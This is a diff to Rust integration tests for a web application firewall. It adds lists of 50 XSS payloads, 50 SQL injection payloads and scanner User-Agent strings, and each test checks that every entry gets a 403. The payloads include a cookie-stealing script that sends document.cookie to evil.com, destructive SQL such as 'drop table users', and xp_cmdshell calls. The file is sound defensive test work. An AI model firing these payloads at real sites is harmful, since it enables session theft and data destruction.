@@ -172,63 +172,213 @@ fn http_client() -> reqwest::Client {
         .unwrap()
 }
 
+// ─── Payload lists ───────────────────────────────────────────────────────────
+
+/// 50 classic XSS payloads — all must be blocked when sent in a POST body.
+const XSS_PAYLOADS: &[&str] = &[
+    "<script>alert(1)</script>",
+    "<script>alert('xss')</script>",
+    "<script src=http://evil.com/x.js></script>",
+    "<img src=x onerror=alert(1)>",
+    "<img src=x onerror=alert('xss')>",
+    "<svg onload=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<iframe src=javascript:alert(1)></iframe>",
+    "<input autofocus onfocus=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<video><source onerror=alert(1)></video>",
+    "<audio src=x onerror=alert(1)>",
+    "<marquee onstart=alert(1)>",
+    "<select autofocus onfocus=alert(1)>",
+    "<textarea autofocus onfocus=alert(1)>",
+    "<keygen autofocus onfocus=alert(1)>",
+    "javascript:alert(1)",
+    "\"><script>alert(1)</script>",
+    "';alert(1)//",
+    "\"/><script>alert(1)</script>",
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
+    "<img src=\"javascript:alert('xss')\">",
+    "<link rel=stylesheet href=javascript:alert(1)>",
+    "<object data=javascript:alert(1)>",
+    "<embed src=javascript:alert(1)>",
+    "<form action=javascript:alert(1)><input type=submit>",
+    "<button onclick=alert(1)>click</button>",
+    "<div onmouseover=alert(1)>hover</div>",
+    "<p onmouseenter=alert(1)>",
+    "<table background=javascript:alert(1)>",
+    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+    "<script>window['al'+'ert'](1)</script>",
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<<script>alert(1)//<</script>",
+    "<script/src=data:,alert(1)>",
+    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
+    "<svg><script>alert(1)</script></svg>",
+    "<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>",
+    "<script>alert`1`</script>",
+    "<script>setTimeout('alert(1)',0)</script>",
+    "<script>setInterval('alert(1)',999999)</script>",
+    "<style>*{background:url('javascript:alert(1)')}</style>",
+    "<base href=javascript:alert(1)//>",
+    "<bgsound src=javascript:alert(1)>",
+    "<!--<img src=\"--><img src=x onerror=alert(1)//>",
+    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+];
+
+/// 50 classic SQLi payloads — all must be blocked when sent in a GET query.
+const SQLI_PAYLOADS: &[&str] = &[
+    "' or '1'='1",
+    "' or '1'='1'--",
+    "' or 1=1--",
+    "' or 1=1#",
+    "' or 1=1/*",
+    "') or ('1'='1",
+    "') or ('1'='1'--",
+    "' or 'x'='x",
+    "1' or '1'='1",
+    "1 or 1=1",
+    "union select 1,2,3--",
+    "union select null,null,null--",
+    "union select @@version,null,null--",
+    "' union select 1,2,3--",
+    "' union select null,null--",
+    "' union all select null--",
+    "1; drop table users--",
+    "1; select * from users--",
+    "'; exec xp_cmdshell('dir')--",
+    "'; exec master..xp_cmdshell('dir')--",
+    "1 and 1=1",
+    "1 and 1=2",
+    "' and '1'='1",
+    "' and 1=1--",
+    "' and sleep(5)--",
+    "1 and sleep(5)",
+    "1; waitfor delay '0:0:5'--",
+    "' waitfor delay '0:0:5'--",
+    "1 and benchmark(5000000,md5(1))#",
+    "' and (select * from (select(sleep(5)))a)--",
+    "1' and extractvalue(1,concat(0x7e,(select version())))--",
+    "' and updatexml(1,concat(0x7e,(select version())),1)--",
+    "1 or (select 1 from dual where 1=1)--",
+    "' or (select 1 from dual where 1=1)--",
+    "admin'--",
+    "admin' #",
+    "admin'/*",
+    "' or 2>1--",
+    "' having 1=1--",
+    "' group by 1--",
+    "' order by 1--",
+    "' order by 100--",
+    "1; insert into users values('hack','hack')--",
+    "1; update users set password='hack'--",
+    "' or ''='",
+    "' or 0=0--",
+    "' or 0=0#",
+    "\" or 0=0--",
+    "\" or \"\"=\"",
+    "' or true--",
+];
+
+/// Scanner User-Agents sampled from rules/user_agents/scanners.txt — all must
+/// be blocked on any request, regardless of payload.
+const SCANNER_UAS: &[&str] = &[
+    "nikto/2.1.6",
+    "sqlmap/1.7",
+    "Nmap Scripting Engine",
+    "masscan/1.3",
+    "nessus/10.0",
+    "openvas/21.4",
+    "gobuster/3.6",
+    "dirbuster/1.0",
+    "arachni/1.5",
+    "nuclei/2.9",
+    "wfuzz/3.1",
+    "commix/3.8",
+    "Mozilla/5.0 (compatible; netsparker/6.0)",
+    "havij/1.17",
+    "Acunetix Web Vulnerability Scanner",
+];
+
 // ─── Tests ────────────────────────────────────────────────────────────────────
 
-/// POST body containing an XSS payload (`<script`) is blocked with HTTP 403.
+/// Sweep 50 XSS payloads via POST body — every one must be blocked (HTTP 403).
 #[tokio::test]
-async fn post_xss_is_blocked() {
+async fn xss_payload_sweep_post() {
     ensure_backend();
     let port = alloc_waf_port();
     let _waf = spawn_waf(port, &[]);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
-    let resp = client
-        .post(format!("{}/test_post", waf_base(port)))
-        .form(&[("payload_test", "<script>alert(1)</script>")])
-        .send()
-        .await
-        .unwrap();
+    for payload in XSS_PAYLOADS {
+        let resp = client
+            .post(format!("{}/test_post", waf_base(port)))
+            .form(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("request failed for XSS payload {payload:?}: {e}"));
 
-    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+        assert_eq!(
+            resp.status(),
+            StatusCode::FORBIDDEN,
+            "XSS payload not blocked: {payload:?}"
+        );
+    }
 }
 
-/// GET query containing a SQLi payload is blocked with HTTP 403.
+/// Sweep 50 SQLi payloads via GET query — every one must be blocked (HTTP 403).
 #[tokio::test]
-async fn get_sqli_is_blocked() {
+async fn sqli_payload_sweep_get() {
     ensure_backend();
     let port = alloc_waf_port();
     let _waf = spawn_waf(port, &[]);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
-    let resp = client
-        .get(format!("{}/test_get", waf_base(port)))
-        .query(&[("payload_test", "' or '1'='1")])
-        .send()
-        .await
-        .unwrap();
+    for payload in SQLI_PAYLOADS {
+        let resp = client
+            .get(format!("{}/test_get", waf_base(port)))
+            .query(&[("payload_test", payload)])
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("request failed for SQLi payload {payload:?}: {e}"));
 
-    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+        assert_eq!(
+            resp.status(),
+            StatusCode::FORBIDDEN,
+            "SQLi payload not blocked: {payload:?}"
+        );
+    }
 }
 
-/// A request carrying a known scanner User-Agent (`nikto`) is blocked (403).
+/// Send a GET with a benign query param but a scanner User-Agent from
+/// scanners.txt — the UA alone must trigger a block (HTTP 403).
 #[tokio::test]
-async fn scanner_ua_is_blocked() {
+async fn scanner_ua_sweep() {
     ensure_backend();
     let port = alloc_waf_port();
     let _waf = spawn_waf(port, &[]);
     let client = http_client();
     wait_for_waf(&client, port).await;
 
-    let resp = client
-        .get(format!("{}/test_one", waf_base(port)))
-        .header("User-Agent", "nikto/2.1.6")
-        .send()
-        .await
-        .unwrap();
+    for ua in SCANNER_UAS {
+        let resp = client
+            .get(format!("{}/test_get", waf_base(port)))
+            .query(&[("payload_test", "hello world")])   // clean payload
+            .header("User-Agent", *ua)
+            .send()
+            .await
+            .unwrap_or_else(|e| panic!("request failed for UA {ua:?}: {e}"));
 
-    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+        assert_eq!(
+            resp.status(),
+            StatusCode::FORBIDDEN,
+            "Scanner UA not blocked: {ua:?}"
+        );
+    }
 }
 
 /// A request from a blocklisted IP (via X-Real-IP + trusted proxy CIDR) is
